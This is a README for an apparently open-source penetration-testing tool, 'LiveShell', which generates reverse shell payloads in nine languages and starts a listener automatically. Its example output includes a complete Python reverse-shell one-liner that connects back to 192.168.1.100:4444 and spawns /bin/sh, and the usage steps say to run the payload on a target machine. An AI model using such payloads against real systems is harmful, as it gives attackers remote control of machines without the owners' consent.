
# LiveShell - Interactive Reverse Shell Generator

![LiveShell Banner](https://i.pinimg.com/736x/f5/b9/f0/f5b9f0bd95f86bf95ed21e8b1abf25d7.jpg)



### LiveShell: 
Is a powerful, interactive tool designed to generate reverse shell payloads in multiple programming languages. Whether you're a penetration tester, security researcher, or ethical hacker, LiveShell simplifies the process of creating reverse shells for various platforms and architectures.

---

## Features

- **Multi-Language Support**: Generate reverse shell payloads in Python, PHP, Bash, Netcat (nc), Perl, Ruby, Go, PowerShell, and JavaScript.
- **Interactive Interface**: User-friendly menu-driven interface for easy navigation.
- **Automated Listener**: Automatically starts a listener for the reverse shell connection.
- **Colorful Output**: Beautiful, hacker-style terminal output with colors for better readability.
- **Cross-Platform**: Works on Linux, macOS, and Windows (with WSL).



## Installation

1. Clone the repository:
   ```bash
   git clone https://github.com/livepwn/liveshell.git
   
   cd liveshell
   
   chmod +x liveshell.py
   ```
### Run the tool
```bash
./liveshell.py
```
# Usage
### 1: Run the tool:

```bash
./liveshell.py
```
### 2: Follow the prompts:

⚬Enter your IP address.

⚬Enter the port to listen on.

⚬Choose a language for the reverse shell payload.

### 3: Copy the generated payload and execute it on the target machine.

### 4: The tool will automatically start a listener. Once the payload is executed, you'll get a reverse shell connection.

## Supported Languages
  ●  Python

  ●  PHP

  ●  Bash

  ●  Netcat (nc)

  ●  Perl

  ●  Ruby

  ●  Go

  ●  PowerShell

  ●  JavaScript

## Advantages
### Fast and Efficient: 
  ▸  Generate reverse shell payloads in seconds.

### No Manual Effort: 
  ▸  Automates the process of creating and testing reverse shells.

### Beginner-Friendly: 
  ▸  Simple, interactive interface for users of all skill levels.

### Extensible: 
▸ Easily add support for new languages or features.

## Example
```
[*] Welcome to LiveShell - Interactive Reverse Shell Generator!
[*] Please provide the following details:

[+] Enter your IP address: 192.168.1.100
[+] Enter the port to listen on (e.g., 4444): 4444

[*] Available languages:
1. Python
2. PHP
3. Bash
4. Netcat (nc)
5. Perl
6. Ruby
7. Go
8. PowerShell
9. JavaScript
[+] Choose a language (1-9): 1

[+] Reverse shell code for python:

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.1.100",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

[*] Starting listener on port 4444...
```

## Author

- [@livepwn](https://www.github.com/livepwn)
